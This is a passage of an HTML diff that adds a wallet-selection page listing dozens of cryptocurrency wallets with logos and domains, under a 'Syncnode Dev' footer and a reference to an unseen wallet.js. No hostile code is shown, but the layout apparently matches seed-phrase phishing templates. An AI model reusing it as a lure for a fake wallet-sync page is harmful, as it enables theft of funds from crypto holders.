+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">GridPlus</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">gridplus.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="tokenary-btn" >
+                    <img src="img/tokenary.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-47" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Tokenary</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">tokenary.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="safepalwallet-btn">
+                    <img src="img/safepal.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-48" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">SafePal</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">safepal.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="infinito-btn">
+                    <img src="img/infinito.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-49">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Infinito</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">infinitowallet.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="walletio-btn">
+                    <img src="img/wallet_io.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-50">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Wallet.io</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">wallet.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="ownbit-btn">
+                    <img src="img/ownbit.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-51">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Ownbit</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer"> ownbit.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="easypocket-btn">
+                    <img src="img/easypocket.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-52" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">EasyPocket</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">easypocket.app</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="bridgewallet-btn">
+                    <img src="img/bridge_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-53" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Bridge Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">mtpelerin.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="viawallet-btn" >
+                    <img src="img/via_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-54" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">ViaWallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">viawallet.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="bitkeep-btn" >
+                    <img src="img/bitkeep.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-55" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">BitKeep</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">bitkeep.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="unstopablewallet-btn">
+                    <img src="img/unstoppable_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-56" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Unstoppable Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">unstoppable.money</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="halodefi-btn" >
+                    <img src="img/halodefi_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-57" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">HaloDefi Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">halodefi.org</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="dockwallet-btn">
+                    <img src="img/dok_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-58" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Dok Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">dokwallet.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="cellowallet-btn" >
+                    <img src="img/celo_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-59">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Cello Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">cellowallet.app</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="coinus-btn" >
+                    <img src="img/coinus.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-60">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">CoinUs</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">coinus.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="valora-btn" >
+                    <img src="img/valora.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-51" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Valora</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">valoraapp.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="trusteewallet-btn">
+                    <img src="img/trustee_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-52">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Trustee Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer"> trusteeglobal.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="guardawallet-btn">
+                    <img src="img/guarda_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-53">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Gaurda Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">guarda.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="jadewallet-bullet">
+                    <img src="img/jade_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-54">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Jade Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">jadewallet.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="plasmapay-btn">
+                    <img src="img/plasmapay.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-55">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">PlasmaPay</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">plasmapay.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="03wallet-btn">
+                    <img src="img/o3_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-56">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">O3Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">o3.network</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="hashkey-btn">
+                    <img src="img/hashkey_me.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-57">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">HashKey Me</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">me.hashkey.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="rwallet-btn">
+                    <img src="img/rwallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-58">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">RWallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">rsk.co</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="flarewallet-btn">
+                    <img src="img/flare_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-59">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Flare Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">flarewallet.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="kyberswap-btn" >
+                    <img src="img/kyberswap.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-60">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">KyberSwap</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">kyberswap.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="atoken-btn">
+                    <img src="img/atoken_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-61">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">AToken Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">atoken.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="tonguewallet-btn">
+                    <img src="img/tongue_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-62" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Tongue Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">tongue.fi</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="xinfin-btn">
+                    <img src="img/xinfin.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-63">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">XinFin XDC Network</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">xinfin.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="talkenwallet-btn" >
+                    <img src="img/talken_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-64" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Talken Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">talken.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="keyringpro-btn">
+                    <img src="img/keyring_pro.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-65" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">KEYRING PRO</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">keyring.app</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="midaswallet-btn">
+                    <img src="img/midas_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-66">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Midas Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">midasprotocol.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="atwallet-btn">
+                    <img src="img/at_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-67">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">AT.Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">authentrend.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="tangemwallet-btn">
+                    <img src="img/tangemlogopng.png" alt="" class="w-20 rounded-full card-logo" id="logo-68" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Tangem Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">Tangem.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="tokenim-btn" >
+                    <img src="img/imtokenlogo.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-69" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">token.im</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">imToken</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="others-btn">
+                    <img src="img/imtokenlogo.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-70" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Others</button>
+                    </div>
+                </div>
+            </div>
+
+            <p class="text-center pt-24 pb-24 text-sm">Syncnode Dev © 2025. All Rights Reserved.</p>
+        </div>
+    </section>
+
+    
+    <script src="wallet.js"></script>
+</body>
+</html>
